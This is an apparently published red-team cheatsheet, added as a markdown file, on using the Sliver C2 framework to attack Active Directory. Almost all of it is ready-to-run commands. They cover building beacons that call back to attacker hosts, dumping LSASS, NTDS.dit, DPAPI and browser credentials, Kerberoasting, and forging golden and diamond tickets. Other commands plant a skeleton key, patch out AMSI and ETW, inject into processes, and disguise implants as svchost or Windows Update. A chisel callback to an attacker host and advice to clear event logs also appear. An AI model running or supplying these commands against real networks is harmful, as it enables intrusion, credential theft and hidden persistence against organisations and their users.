@@ -1,0 +1,767 @@
+---
+title: 'Sliver C2 — Active Directory Hacking Cheatsheet'
+description: 'Comprehensive Sliver C2 reference for Active Directory offensive operations. Covers setup, implant generation, armory tools, AD enumeration, Kerberos attacks, lateral movement, domain dominance, and OPSEC.'
+date: 2026-04-29
+tags:
+  [
+    'redteam',
+    'activedirectory',
+    'C2',
+    'sliver',
+    'kerberos',
+    'pentest',
+    'offensive-security',
+  ]
+image: 'assets/banner.png'
+authors: ['thehackersbrain']
+---
+
+> **Framework:** BishopFox Sliver C2 | **Focus:** Active Directory Offensive Operations
+
+---
+
+## 1. Server Setup & Operators
+
+### Install
+
+```bash
+# Latest release
+curl https://sliver.sh/install | sudo bash
+
+# From source (Go required)
+git clone https://github.com/BishopFox/sliver
+cd sliver && make
+
+# Start server (daemon mode)
+sliver-server daemon --lhost 0.0.0.0 --lport 31337
+```
+
+### Operator Management
+
+```bash
+# Generate operator config (on server)
+sliver-server operator --name operator1 --lhost <C2_IP> --save /tmp/operator1.cfg
+
+# Connect as operator
+sliver-client import /tmp/operator1.cfg
+sliver-client
+
+# List operators
+operators
+
+# Kick operator
+kick-operator --name operator1
+```
+
+### Config File Locations
+
+```
+~/.sliver-client/configs/<profile>.cfg   # client config
+~/.sliver/                               # server data, certs, implants
+```
+
+---
+
+## 2. Listeners & C2 Channels
+
+### mTLS (default, fastest)
+
+```
+mtls --lhost 0.0.0.0 --lport 8888
+```
+
+### HTTPS (most evasive for egress)
+
+```
+https --lhost 0.0.0.0 --lport 443 --domain legit-looking-domain.com
+```
+
+### DNS (for locked-down environments)
+
+```bash
+# Step 1: Point NS record to your C2 server
+# Step 2: Start listener
+dns --domains c2.yourdomain.com --lhost 0.0.0.0
+
+# DNS canary (for detection testing)
+canaries
+```
+
+### WireGuard
+
+```
+wg --lhost 0.0.0.0 --lport 53 --n-port 8888 --key-port 1337
+```
+
+### HTTP (fallback)
+
+```
+http --lhost 0.0.0.0 --lport 80
+```
+
+### Managing Listeners
+
+```
+jobs          # list active listeners
+jobs -k <id>  # kill listener
+```
+
+---
+
+## 3. Implant Generation
+
+### Staged vs Stageless
+
+| Type      | Command Flag         | Use Case                    |
+| --------- | -------------------- | --------------------------- |
+| Stageless | (default)            | Preferred — one-shot binary |
+| Staged    | `--format shellcode` | Macro drops, loader chains  |
+
+### Generate Beacon (AD standard)
+
+```bash
+# HTTPS beacon — Windows x64 exe
+generate beacon --http https://c2.domain.com --os windows --arch amd64 \
+  --format exe --sleep 30 --jitter 15 --save /tmp/beacon.exe
+
+# mTLS beacon — DLL (for sideloading)
+generate beacon --mtls 10.10.10.10:8888 --os windows --arch amd64 \
+  --format shared --name "legit" --save /tmp/legit.dll
+
+# DNS beacon
+generate beacon --dns c2.yourdomain.com --os windows --arch amd64 \
+  --sleep 60 --jitter 20 --save /tmp/dns_beacon.exe
+
+# Shellcode for custom loader
+generate beacon --mtls 10.10.10.10:8888 --os windows --arch amd64 \
+  --format shellcode --save /tmp/payload.bin
+```
+
+### Generate Session (interactive)
+
+```bash
+generate --mtls 10.10.10.10:8888 --os windows --arch amd64 \
+  --format exe --save /tmp/session.exe
+```
+
+### Implant Profiles (reuse configs)
+
+```bash
+# Save profile
+profiles new --mtls 10.10.10.10:8888 --os windows --arch amd64 \
+  --format exe --name "corp-beacon"
+
+# Generate from profile
+profiles generate --name corp-beacon --save /tmp/
+
+# List profiles
+profiles
+
+# Regenerate existing implant
+regenerate <implant-name>
+```
+
+---
+
+## 4. Session vs Beacon
+
+| Feature        | Session                    | Beacon                             |
+| -------------- | -------------------------- | ---------------------------------- |
+| Connection     | Persistent / interactive   | Check-in intervals (sleep/jitter)  |
+| Noise          | High — constant TCP stream | Low — periodic bursts              |
+| Detection risk | Higher                     | Lower                              |
+| Use case       | Initial access, quick enum | Long-haul persistence, stealth ops |
+| Task queue     | Real-time                  | Tasks queued, exec on check-in     |
+
+```bash
+# List all implants
+sessions
+beacons
+
+# Interact
+sessions -i <id>
+beacons -i <id>
+```
+
+---
+
+## 5. Core Interaction Commands
+
+```bash
+info                    # implant info, PID, UID, hostname
+whoami
+getuid
+ps                      # process list
+pwd
+ls
+cat <file>
+upload <local> <remote>
+download <remote> <local>
+execute -o <cmd>        # execute and capture output
+screenshot
+background              # return to sliver> prompt
+```
+
+---
+
+## 6. Armory — Top Tools
+
+### Install
+
+```bash
+armory                  # list all packages
+armory install <name>
+armory install all      # install everything
+armory update
+```
+
+### AD-Focused Armory Packages
+
+| Package                   | Description                   | AD Use Case                             |
+| ------------------------- | ----------------------------- | --------------------------------------- |
+| `sharp-hound`             | SharpHound BOF                | BloodHound collection in-memory         |
+| `sharp-view`              | SharpView (PowerView C# port) | LDAP/AD enum without PowerShell         |
+| `rubeus`                  | Kerberos attack toolkit       | AS-REP, Kerberoast, PTT, S4U            |
+| `seatbelt`                | Host/domain recon             | GPO, registry, scheduled tasks          |
+| `sharp-dpapi`             | DPAPI decryption              | Chrome/RDP creds, Wi-Fi keys            |
+| `adcs-attack`             | AD CS attack toolkit          | ESC1–ESC8 abuse                         |
+| `certify`                 | AD CS enumeration             | Find misconfigured templates            |
+| `sharp-ldap-relayx`       | LDAP relay BOF                | NTLM relay to LDAP                      |
+| `sharp-wmi`               | WMI lateral movement          | Exec via WMI                            |
+| `nanodump`                | Evasive LSASS dump            | Credential extraction                   |
+| `bof-net`                 | BOF .NET loader               | Run .NET assemblies in BOF context      |
+| `inline-execute-assembly` | In-memory .NET                | Load C# tools without disk              |
+| `sharpup`                 | PE checks                     | Find local privilege escalation vectors |
+| `sharp-secretsdump`       | NTDS.dit parsing              | Domain hash extraction                  |
+| `mimikatz`                | Credential toolkit            | Credential dumping                      |
+| `sharp-rdp`               | RDP session hijacking         | High-priv RDP takeover                  |
+
+### BOF vs execute-assembly
+
+```bash
+# BOF — runs in beacon process, no CLR load, smaller footprint (preferred)
+bof /path/to/file.o arg1 arg2
+
+# execute-assembly — loads CLR into process, more detectable
+execute-assembly /path/to/Sharp.exe -- arg1 arg2
+
+# inline-execute-assembly — reflective load, no disk touch
+inline-execute-assembly /path/to/Sharp.exe arg1 arg2
+```
+
+> **OPSEC note:** Prefer BOFs over `execute-assembly` wherever an equivalent exists.
+> Loading the CLR into a process is trivially detectable — it shows as an anomalous
+> .NET runtime loaded in a non-.NET process (e.g., notepad.exe).
+
+---
+
+## 7. AD Enumeration
+
+### BloodHound Collection (In-Memory)
+
+```bash
+# SharpHound via armory
+sharp-hound-4 -- --CollectionMethods All --ZipFileName loot.zip
+
+# Via execute-assembly
+execute-assembly /opt/SharpHound.exe -- -c All --ZipFileName bh.zip
+
+# Download
+download C:\\Users\\user\\bh.zip /tmp/bh.zip
+```
+
+### LDAP Enumeration (SharpView)
+
+```bash
+# Domain fundamentals
+sharp-view -- Get-Domain
+sharp-view -- Get-DomainController
+sharp-view -- Get-DomainTrust
+
+# Users
+sharp-view -- Get-DomainUser
+sharp-view -- Get-DomainUser -SPN                          # Kerberoastable
+sharp-view -- Get-DomainUser -AdminCount                   # AdminSDHolder protected
+sharp-view -- Get-DomainUser --Properties SamAccountName,Description  # hunt creds in descriptions
+
+# Groups
+sharp-view -- Get-DomainGroup -Identity "Domain Admins" -Recurse
+sharp-view -- Get-DomainGroupMember -Identity "Enterprise Admins"
+
+# Computers
+sharp-view -- Get-DomainComputer -OperatingSystem "*Server*"
+sharp-view -- Get-DomainComputer -Unconstrained             # unconstrained delegation
+
+# GPOs
+sharp-view -- Get-DomainGPO
+sharp-view -- Get-DomainGPOLocalGroup                      # local admins via GPO
+
+# ACLs — highest signal for attack paths
+sharp-view -- Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+sharp-view -- Find-InterestingDomainAcl -ResolveGUIDs       # find juicy ACEs
+
+# Shares
+sharp-view -- Find-DomainShare
+sharp-view -- Find-InterestingDomainShareFile -Include "*.config,*.xml,*password*"
+
+# Where can I local admin right now?
+sharp-view -- Find-LocalAdminAccess
+
+# Active sessions (who's on what box)
+sharp-view -- Get-NetSession -ComputerName DC01
+```
+
+### Seatbelt (Host Recon)
+
+```bash
+execute-assembly /opt/Seatbelt.exe -- -group=system
+execute-assembly /opt/Seatbelt.exe -- GPOProcessing
+execute-assembly /opt/Seatbelt.exe -- CredGuard
+execute-assembly /opt/Seatbelt.exe -- Certificates
+execute-assembly /opt/Seatbelt.exe -- TokenPrivileges
+execute-assembly /opt/Seatbelt.exe -- LogonSessions
+execute-assembly /opt/Seatbelt.exe -- DpapiMasterKeys
+```
+
+---
+
+## 8. Credential Access & Kerberos Attacks
+
+### Kerberoasting
+
+```bash
+# Roast all SPNs
+execute-assembly /opt/Rubeus.exe -- kerberoast /format:hashcat /outfile:hashes.txt
+
+# Target specific user
+execute-assembly /opt/Rubeus.exe -- kerberoast /user:svc_sql /format:hashcat
+
+# Crack: hashcat -m 13100 hashes.txt wordlist.txt
+```
+
+### AS-REP Roasting
+
+```bash
+# Find accounts with pre-auth disabled
+sharp-view -- Get-DomainUser -PreauthNotRequired
+
+# Roast
+execute-assembly /opt/Rubeus.exe -- asreproast /format:hashcat /outfile:asrep.txt
+
+# Crack: hashcat -m 18200 asrep.txt wordlist.txt
+```
+
+### Pass-the-Ticket
+
+```bash
+# Dump all tickets
+execute-assembly /opt/Rubeus.exe -- triage
+execute-assembly /opt/Rubeus.exe -- dump /service:krbtgt /nowrap
+
+# Import ticket into current session
+execute-assembly /opt/Rubeus.exe -- ptt /ticket:<base64-ticket>
+
+# Verify
+execute-assembly /opt/Rubeus.exe -- klist
+```
+
+### Overpass-the-Hash (NTLM Hash → TGT)
+
+```bash
+execute-assembly /opt/Rubeus.exe -- asktgt /user:admin /rc4:<NTLM_HASH> /ptt
+
+# AES — preferred (less detectable)
+execute-assembly /opt/Rubeus.exe -- asktgt /user:admin /aes256:<AES_HASH> /opsec /ptt
+```
+
+### Token Manipulation
+
+```bash
+steal-token <PID>              # impersonate token from process
+make-token DOMAIN user pass    # create logon token with known creds
+rev2self                       # drop impersonation
+```
+
+### LSASS Dump (Evasive)
+
+```bash
+# NanoDump — avoids common hooks
+nanodump --pid <lsass_pid> --write C:\\Windows\\Temp\\nano.dmp
+download C:\\Windows\\Temp\\nano.dmp /tmp/
+# Parse: pypykatz lsa minidump nano.dmp
+```
+
+### DPAPI
+
+```bash
+# List DPAPI master keys
+execute-assembly /opt/SharpDPAPI.exe -- masterkeys
+
+# Decrypt with domain backup key
+execute-assembly /opt/SharpDPAPI.exe -- backupkey --server DC01.domain.com
+execute-assembly /opt/SharpDPAPI.exe -- credentials
+
+# Browser passwords
+execute-assembly /opt/SharpDPAPI.exe -- logins
+
+# RDP saved creds
+execute-assembly /opt/SharpDPAPI.exe -- rdg
+```
+
+### DCSync
+
+```bash
+# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
+execute-assembly /opt/mimikatz.exe -- '"lsadump::dcsync /domain:corp.local /user:krbtgt"' exit
+
+# All hashes
+execute-assembly /opt/mimikatz.exe -- '"lsadump::dcsync /domain:corp.local /all /csv"' exit
+```
+
+---
+
+## 9. Lateral Movement
+
+### Upload + Execute
+
+```bash
+upload /tmp/beacon.exe C:\\Windows\\Temp\\svchost.exe
+execute -o cmd.exe /c "C:\\Windows\\Temp\\svchost.exe"
+```
+
+### Built-in PsExec
+
+```bash
+psexec --hostname TARGET01 \
+  --service-name "WindowsUpdate" \
+  --service-description "Windows Update Service" \
+  /path/to/implant.exe
+```
+
+### WMI
+
+```bash
+execute-assembly /opt/SharpWMI.exe -- action=exec computername=TARGET01 \
+  command="C:\\Temp\\beacon.exe"
+
+# With alternate creds
+execute-assembly /opt/SharpWMI.exe -- action=exec computername=TARGET01 \
+  username=DOMAIN\\admin password=P@ssw0rd command="C:\\Temp\\b.exe"
+```
+
+### SMB P2P Beacons (Best Practice for Internal Movement)
+
+```bash
+# Generate SMB beacon
+generate beacon --smb-named-pipe \\.\pipe\svcctl --os windows --arch amd64 \
+  --format exe --save /tmp/smb_beacon.exe
+
+# Connect to it from compromised host (no new external C2 connection)
+connect --smb \\TARGET01\pipe\svcctl
+```
+
+> **Why SMB beacons matter:** Every host doing lateral movement via SMB beacon
+> creates zero new outbound C2 connections. Defenders watching egress get nothing.
+
+---
+
+## 10. Privilege Escalation
+
+### Enumeration
+
+```bash
+# SharpUp — fast local PE checks
+execute-assembly /opt/SharpUp.exe -- audit
+execute-assembly /opt/SharpUp.exe -- UnquotedServicePath
+execute-assembly /opt/SharpUp.exe -- ModifiableServiceBinary
+execute-assembly /opt/SharpUp.exe -- AlwaysInstallElevated
+execute-assembly /opt/SharpUp.exe -- ModifiableScheduledTask
+```
+
+### SeImpersonatePrivilege
+
+```bash
+# Check first
+execute -o whoami /priv
+
+# PrintSpoofer (if Spooler running)
+execute-assembly /opt/PrintSpoofer.exe -- -i -c "C:\\Temp\\beacon.exe"
+
+# GodPotato (more universal, works on modern Windows)
+execute-assembly /opt/GodPotato.exe -- -cmd "C:\\Temp\\beacon.exe"
+```
+
+### ACL Abuse (GenericWrite / GenericAll / WriteDACL)
+
+```bash
+# Find abusable ACEs
+sharp-view -- Find-InterestingDomainAcl -ResolveGUIDs
+
+# GenericWrite on user → targeted Kerberoasting
+sharp-view -- Set-DomainObject -Identity "target_user" \
+  -Set @{ServicePrincipalName='fake/spn'}
+execute-assembly /opt/Rubeus.exe -- kerberoast /user:target_user /format:hashcat
+
+# GenericAll on group → add yourself
+sharp-view -- Add-DomainGroupMember -Identity "Domain Admins" -Members "lowpriv"
+```
+
+---
+
+## 11. Domain Dominance
+
+### Golden Ticket
+
+```bash
+# Get domain SID
+sharp-view -- Get-DomainSID
+
+# Forge TGT for any user
+execute-assembly /opt/Rubeus.exe -- golden /rc4:<KRBTGT_HASH> \
+  /domain:corp.local /sid:S-1-5-21-... /user:fakegod /ptt
+```
+
+### Silver Ticket (stealthier — targets specific service)
+
+```bash
+execute-assembly /opt/Rubeus.exe -- silver /service:cifs/DC01.corp.local \
+  /rc4:<MACHINE_ACCOUNT_HASH> /domain:corp.local /sid:S-1-5-21-... \
+  /user:fakegod /ptt
+```
+
+### Diamond Ticket (least detectable)
+
+```bash
+# Modifies a real TGT instead of forging from scratch
+# Evades ticket anomaly detection that catches golden tickets
+execute-assembly /opt/Rubeus.exe -- diamond /tgtdeleg /ticketuser:admin \
+  /ticketuserid:500 /groups:512 /krbkey:<AES256_KRBTGT> /domain:corp.local /ptt
+```
+
+### Skeleton Key (LSASS patch on DC)
+
+```bash
+# All domain users accept password "mimikatz" after this
+execute-assembly /opt/mimikatz.exe -- '"privilege::debug" "misc::skeleton"' exit
+```
+
+### AdminSDHolder Abuse (Persistence via SDProp)
+
+```bash
+# Grant yourself GenericAll on AdminSDHolder
+# SDProp runs every 60min → propagates to all protected groups automatically
+sharp-view -- Add-DomainObjectAcl \
+  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
+  -PrincipalIdentity lowpriv -Rights All
+```
+
+### RBCD (Resource-Based Constrained Delegation)
+
+```bash
+# Requires: GenericWrite on target computer object
+
+# Step 1: Create attacker-controlled computer account
+execute-assembly /opt/StandIn.exe -- --computer fake01 --make
+
+# Step 2: Set RBCD — allow fake01 to delegate to target
+sharp-view -- Set-DomainRBCD -Identity TARGET_COMP -DelegateFrom FAKE01$
+
+# Step 3: S4U chain → get service ticket as Administrator
+execute-assembly /opt/Rubeus.exe -- s4u /user:FAKE01$ /rc4:<hash> \
+  /impersonateuser:Administrator /msdsspn:cifs/TARGET_COMP /ptt
+```
+
+### Unconstrained Delegation + Coercion
+
+```bash
+# Find targets
+sharp-view -- Get-DomainComputer -Unconstrained
+
+# Monitor for incoming TGTs
+execute-assembly /opt/Rubeus.exe -- monitor /interval:5 /nowrap
+
+# Trigger coercion externally (PetitPotam, PrinterBug, DFSCoerce)
+# python PetitPotam.py <UNCONSTRAINED_HOST_IP> DC01
+
+# Inject received TGT
+execute-assembly /opt/Rubeus.exe -- ptt /ticket:<base64>
+```
+
+### AD CS Attacks (ESC1–ESC8)
+
+```bash
+# Enumerate vulnerable templates
+execute-assembly /opt/Certify.exe -- find /vulnerable
+execute-assembly /opt/Certify.exe -- find /vulnerable /currentuser
+
+# ESC1: SAN abuse — request cert as DA
+execute-assembly /opt/Certify.exe -- request /ca:CA01\corp-CA \
+  /template:VulnTemplate /altname:Administrator
+
+# Use certificate for TGT
+execute-assembly /opt/Rubeus.exe -- asktgt /user:Administrator \
+  /certificate:<base64pfx> /password:certpass /ptt
+```
+
+---
+
+## 12. Defense Evasion & OPSEC
+
+### AMSI / ETW
+
+```bash
+# Sliver patches AMSI automatically for execute-assembly
+# Manual AMSI patch via BOF
+bof /opt/bofs/amsi-bypass.o
+
+# ETW patch
+bof /opt/bofs/etw-patch.o
+```
+
+### Process Migration & Injection
+
+```bash
+# Migrate implant into a legitimate process
+migrate <PID>
+
+# Inject shellcode into remote process
+inject --pid <PID> /path/to/shellcode.bin
+
+# Spawn sacrificial process and inject into it
+spawndll --process notepad.exe /path/to/reflective.dll
+```
+
+### OPSEC Checklist
+
+```
+[ ] Use beacons over sessions (sleep 30-120s + 20-30% jitter)
+[ ] Use HTTPS/DNS over mTLS in monitored networks
+[ ] Rename binary — avoid default Sliver-generated names
+[ ] Migrate into legitimate signed processes (explorer, svchost, wmiprvse)
+[ ] Never run mimikatz as .exe on disk — use execute-assembly or BOF
+[ ] Avoid LSASS unless necessary
+[ ] Clear event logs post-op
+[ ] Use SMB beacons for internal lateral movement
+[ ] Prefer BOFs over execute-assembly (no CLR load)
+[ ] Check for honeytoken accounts in BloodHound output before touching them
+```
+
+---
+
+## 13. Pivoting & Tunneling
+
+### SOCKS5 (route tooling through implant)
+
+```bash
+socks5 start --host 127.0.0.1 --port 1080
+# proxychains4 -q impacket-secretsdump DOMAIN/user:pass@DC01
+
+socks5 stop
+```
+
+### Port Forwarding
+
+```bash
+portfwd add --remote 192.168.1.10:445 --local 127.0.0.1:4450
+portfwd ls
+portfwd rm -i <id>
+```
+
+### Chisel via Sliver (complex pivot scenarios)
+
+```bash
+upload /opt/chisel.exe C:\\Windows\\Temp\\c.exe
+execute -o C:\\Windows\\Temp\\c.exe client <attacker>:8080 R:1080:socks
+```
+
+---
+
+## 14. Loot & Exfil
+
+### Loot Commands
+
+```bash
+loot              # list all collected loot
+loot fetch -i <id>
+```
+
+### NTDS.dit via Shadow Copy
+
+```bash
+execute -o cmd.exe /c "vssadmin create shadow /for=C:"
+execute -o cmd.exe /c "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\"
+execute -o cmd.exe /c "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\"
+download C:\\Temp\\ntds.dit /tmp/
+download C:\\Temp\\SYSTEM /tmp/
+# Parse: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+### Credential Files
+
+```bash
+download "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*" /tmp/dpapi/
+download "C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" /tmp/
+```
+
+---
+
+## 15. Multiplayer Ops
+
+```bash
+# Generate operator configs
+sliver-server operator --name op1 --lhost <IP> --save /tmp/op1.cfg
+sliver-server operator --name op2 --lhost <IP> --save /tmp/op2.cfg
+
+# All operators share the same session/beacon pool
+# Real-time event feed
+events
+```
+
+---
+
+## 16. Quick Reference Card
+
+### AD Attack Chain
+
+```
+Initial Access
+  └─► Enumeration (SharpHound, SharpView, Seatbelt)
+        └─► Credential Access (Kerberoast, AS-REP, LSASS, DPAPI)
+              └─► Lateral Movement (WMI, SMB P2P, Token Impersonation)
+                    └─► Privilege Escalation (ACL Abuse, Delegation, SeImpersonate)
+                          └─► Domain Dominance (DCSync, Golden/Diamond Ticket, AD CS)
+                                └─► Persistence (Skeleton Key, AdminSDHolder, RBCD)
+```
+
+### High-Value One-Liners
+
+```bash
+# Where can I local admin right now?
+sharp-view -- Find-LocalAdminAccess
+
+# All users — SPNs + pre-auth flags
+sharp-view -- Get-DomainUser | Select-Object samaccountname,serviceprincipalname,useraccountcontrol
+
+# Kerberoast + AS-REP in one go
+execute-assembly /opt/Rubeus.exe -- kerberoast /format:hashcat
+execute-assembly /opt/Rubeus.exe -- asreproast /format:hashcat
+
+# Dump all DC hashes once you're DA
+execute-assembly /opt/mimikatz.exe -- '"lsadump::dcsync /domain:corp.local /all /csv"' exit
+
+# Find shortest path to DA (BloodHound Cypher)
+# MATCH p=shortestPath((n:User {name:"LOWPRIV@CORP.LOCAL"})-[*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
+```
+
+### Common Errors
+
+| Error                     | Fix                                             |
+| ------------------------- | ----------------------------------------------- |
+| `connection refused`      | Check listener is running (`jobs`)              |
+| `certificate error`       | Cert rotation occurred — regenerate implant     |
+| `session lost`            | Process killed or network drop — redeploy       |
+| `access denied` on inject | Need higher priv — `steal-token` first          |
+| BOF crashes beacon        | Wrong arch or BOF bug — verify `.o` target arch |
+
+---
+
